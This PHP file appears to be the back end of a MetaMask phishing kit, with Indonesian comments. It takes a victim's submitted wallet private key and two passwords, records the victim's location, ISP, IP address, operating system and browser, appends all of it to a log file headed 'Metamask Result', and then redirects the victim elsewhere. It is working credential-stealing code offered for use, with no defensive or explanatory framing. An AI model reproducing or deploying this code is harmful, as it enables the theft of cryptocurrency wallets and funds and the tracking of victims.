<?php 
include '../TokoAlexHost.com/UserAgent.php';
include '../TokoAlexHost.com/daerah.php';

// MENANGKAP DATA YANG DI-INPUT
$PrivateKey = $_POST['PrivateKey'];
$password1 = $_POST['password1'];
$password2 = $_POST['password2'];
$direct = $_POST['direct'];


$benua = $alex['continent'];
$negara = $alex['country'];
$region = $alex['regionName'];
$city = $alex['city'];
$latitude = $alex['lat'];
$longtitude = $alex['lon'];
$timezone = $alex['timezone'];
$perdana = $alex['isp'];
$ipaddress = $alex['query'];
$platform = $infos['platfrm_name'];
$osversi = $infos['platfrm_vers'];
$browser = $infos['browser_name'];

			    
$myfile = fopen("../mt.txt", "a") or die("Unable to open file!");
$txt = "Metamask Result \n\n";
fwrite($myfile, $txt);
$txt = "PrivateKey: $PrivateKey \n";
fwrite($myfile, $txt);
$txt = "Password 1 : $password1\n";
fwrite($myfile, $txt);
$txt = "Password 2 : $password2\n";
fwrite($myfile, $txt);
$txt = "Daerah: $negara / $region / $city / $latitude / $longtitude / $timezone \n";
fwrite($myfile, $txt);
$txt = "User Agents: $perdana / $ipaddress / $platform / $osversi / $browser \n\n\n\n";
fwrite($myfile, $txt);
$txt = "--------------------------------- \n\n";
fwrite($myfile, "-".$txt);
fclose($myfile);

header("Location: $direct"); 

?>